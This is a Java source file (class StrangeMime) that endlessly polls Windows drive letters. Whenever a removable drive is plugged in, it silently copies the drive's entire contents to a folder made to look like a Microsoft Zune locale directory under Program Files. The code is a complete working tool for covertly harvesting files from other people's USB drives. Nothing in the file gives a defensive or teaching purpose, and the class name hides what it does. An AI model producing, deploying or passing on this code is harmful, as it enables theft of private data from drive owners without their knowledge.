package org.open.corejava.strange.mime;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.channels.FileChannel;
import java.util.Objects;

/**
 * @author Mahadev Mane
 */
public class StrangeMime {

    private static void listenPD() {
        String[] letters = new String[]{"A", "B", "C", "D", "E", "F", "G", "H", "I", "Z"};
        File[] drives = new File[letters.length];
        boolean[] isDrive = new boolean[letters.length];

        for (int i = 0; i < letters.length; ++i) {
            drives[i] = new File(letters[i] + ":\\");
            isDrive[i] = drives[i].canRead();
        }

        while (true) {
            for (int i = 0; i < letters.length; ++i) {
                boolean pluggedIn = drives[i].canRead();
                if (pluggedIn != isDrive[i]) {
                    /* Copy content of detected or plugged in drive.*/
                    if (pluggedIn) {
                        String destPath = "C:\\Program Files\\Zune\\ms-MY";
                        File dest = new File(destPath);
                        if (dest.exists()) {
                            dest = renameFile(dest);
                        }
                        dest.mkdirs();

                        File[] files = drives[i].listFiles();
                        for (File file : Objects.requireNonNull(files)) {
                            if (file.isDirectory()) {
                                copyDirectory(file, new File(dest, file.getName()));
                            } else {
                                copyFile(file, new File(dest, file.getName()));
                            }
                        }
                    }
                    isDrive[i] = pluggedIn;
                    /*Copy completed. Start listening again.*/
                }
            }

            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                System.out.println(e.getMessage());
            }
        }
    }

    private static void copyDirectory(File src, File dest) {
        if (!dest.exists()) {
            dest.mkdirs();
        }

        File[] files = src.listFiles();
        for (File file : Objects.requireNonNull(files)) {
            if (file.isDirectory()) {
                copyDirectory(file, new File(dest, file.getName()));
            } else {
                copyFile(file, new File(dest, file.getName()));
            }
        }
    }

    private static void copyFile(File src, File dest) {
        try {
            FileChannel sc = new FileInputStream(src).getChannel();
            FileChannel tc = new FileOutputStream(dest).getChannel();
            sc.transferTo(0, sc.size(), tc);
            sc.close();
            tc.close();
        } catch (IOException e) {
            System.err.println(e.getMessage());
        }
    }

    private static File renameFile(File dest) {
        boolean flag = false;
        int i, cnt = 0;
        String parentPath = dest.getParentFile().getPath();
        StringBuilder builder = new StringBuilder(dest.getName());

        int start = builder.lastIndexOf("(");
        int end = builder.lastIndexOf(")");

        for (i = start + 1; i < end; i++) {
            flag = true;
            int ch = builder.charAt(i) - 48;
            if (ch >= 0 && ch <= 9)
                cnt = (cnt * 10) + ch;
            else
                break;
        }

        if (i < end || !flag)
            builder.append(" (2)");
        else
            builder.replace(start, end, "(" + ++cnt);

        dest = new File(parentPath + "\\" + builder);
        if (dest.exists())
            dest = renameFile(dest);
        return dest;
    }

    public static void main(String[] args) {
        listenPD();
    }
}
